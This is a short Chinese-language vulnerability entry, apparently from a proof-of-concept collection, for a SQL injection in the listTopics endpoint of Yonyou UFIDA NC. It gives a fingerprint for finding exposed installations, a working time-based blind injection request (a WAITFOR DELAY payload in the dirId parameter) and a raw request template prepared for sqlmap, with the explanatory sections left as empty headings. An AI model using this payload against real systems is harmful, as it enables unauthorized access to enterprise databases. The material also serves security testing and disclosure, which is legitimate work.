# 用友UFIDANClistTopics存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友 UFIDA NC"`
- **请求**：`GET /portal/fm/forum/main_action?cmd=listTopics&dirId=11';WAITFOR+DELAY'0:0:5'--+ HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=8EBDF4C237BC5C74D3DCFBC03A800E45.server1; sl-session=jDXMDyG3JGVNQdvt…`

**请求体 / payload**
```

sqlmap
GET /portal/fm/forum/main_action?cmd=listTopics&dirId=11 HTTP/1.1
Host: xx.xx.xx.xx
Cookie: JSESSIONID=8EBDF4C237BC5C74D3DCFBC03A800E45.server1; sl-session=jDXMDyG3JGVNQdvtd8uUlQ==; JSESSIONID=5BD4AC755F0F34EF57DA011EAD45C94C.server1
```

**其他**
- 用友UFIDA NC listTopics存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友UFIDA NC